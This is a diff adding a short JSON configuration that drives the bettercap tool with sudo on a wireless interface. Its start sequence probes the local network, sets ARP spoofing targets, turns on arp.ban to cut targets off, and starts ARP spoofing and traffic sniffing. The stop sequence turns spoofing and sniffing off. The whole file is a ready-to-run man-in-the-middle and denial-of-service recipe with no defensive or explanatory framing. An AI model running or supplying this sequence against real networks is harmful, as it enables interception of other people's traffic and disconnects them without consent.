@@ -1,0 +1,19 @@
+{
+  "program": "sudo bettercap -iface wlan0",
+  "interactions": {
+    "start": [
+      ["net.probe on", "*"],
+      ["net.show", "*"],
+      ["set arp.spoof.targets <IP>", "*"],
+      ["arp.ban on", "*"],
+      ["arp.spoof on", "*"],
+      ["net.sniff on", "*"]
+    ],
+    "stop": [
+      ["arp.spoof off", "*"],
+      ["net.sniff off", "*"]
+    ]
+  }
+}
+
+
